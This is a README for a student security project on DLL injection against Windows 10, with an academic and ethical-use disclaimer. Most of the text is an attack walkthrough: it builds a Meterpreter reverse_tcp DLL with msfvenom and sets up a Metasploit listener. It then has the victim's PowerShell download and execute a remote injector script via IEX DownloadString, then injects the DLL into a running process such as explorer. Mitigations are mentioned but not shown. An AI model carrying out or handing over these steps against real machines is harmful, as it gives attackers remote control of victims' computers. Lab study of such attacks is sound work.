

# DLL Injection

This project was developed for the **Security of Systems and Networks** curricular unit in the **Master’s in Electrical and Computer Engineering** at [FEUP](https://sigarra.up.pt/feup/en/ucurr_geral.ficha_uc_view?pv_ocorrencia_id=516519).

The course aims to familiarize students with the limitations of protocols, services, systems, and communication infrastructure when faced with motivated attackers, and with countermeasures to mitigate those threats. Topics include threat modeling, attacks across the TCP/IP stack, intrusion detection, access control, VPNs, and secure protocol design.

For the final project, an implementation of a controlled **DLL injection** proof-of-concept targeting Windows 10 in a safe, laboratory environment. The demonstration injects a DLL payload (used only for academic testing) to illustrate how an attacker might obtain remote access and how such an attack can be detected and mitigated. The experiment used a Meterpreter-type payload in a contained setup to validate detection and defense strategies rather than to facilitate malicious activity.

Through this project, I gained practical experience in:

- Windows process internals and dynamic-link library (DLL) mechanisms
- Common attack vectors and their limitations (payload delivery, injection techniques, and persistence considerations)
- Defensive measures and mitigation strategies (process hardening, application whitelisting, endpoint detection, and proper logging)
- Threat modeling and ethical, lab-based security testing practices

[For a full overview of the project, see the PDF here](https://drive.google.com/file/d/19SYEOaJCezkW4TYwcMkxOzta676CVARS/view?usp=sharing) or in the pdf folder.
> **Note:** This work was performed strictly for educational purposes in a controlled lab environment. Implementation details and exploit code are documented only within the repo for academic review and are not intended for malicious use.



## Attack Guide
### Creation of the DLL and setup of the listener

Open Kali Linux terminal and type the following command:

```
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<SOME_PORT> -f dll > <OUTPUT_PATH>
```

Once the DLL is created in the output path specified, copy it to a USB storage device.

After that, we need to setup the listener. Firstly, open the Metasploit Framwork console by typing the command:

```
  msfconsole
```
Once it opens, select usage of "exploit/multi/handler" module:

```
  use exploit/multi/handler
```

Then, set the payload used to create the DLL file:

```
  set payload windows/x64/meterpreter/reverse_tcp
```

Now set your IP:

```
  set lhost <YOUR_IP>
```

And the port specified previously:

```
  set lport <SOME_PORT>
```

Finally to start listening just execute:

```
  exploit
```

As soon as the victim's machine has the DLL injected the connection will establish and you should see something like this.

![App Screenshot](https://raw.githubusercontent.com/GVO72/SSR_FP/main/Images/listener_established_conn.png)

### DLL injection in victims PC - Manually

Insert the USB storage device and open Powershell.

Now run the command below, select a process where you will inject the DLL and anotate its pid.

```
  ps
```

After that, enable TLS 1.2 with the command:

```
  [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
```

Download the injector provided in this repository:

```
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GVO72/SSR_FP/main/Invoke-DllInjection.ps1')
```

And finally inject the malicious DLL with the command:

```
  Invoke-DllInjection -ProcessID <selected_pid> -Dll <path_of_the_dll>
```

If everything works as expected you should see something like this.

![App Screenshot](https://raw.githubusercontent.com/GVO72/SSR_FP/main/Images/ps_comands.png)

### DLL injection in victims PC - Script automated

If the victim's machines allows Powershell scripts to be executed you can simply download our script that does the the injection commands for you. Basically it searches for the pid of "explorer" and injects the DLL that he presumes to be in D:\ and is named "inject.dll". You can change the path to your DLL's name and path.
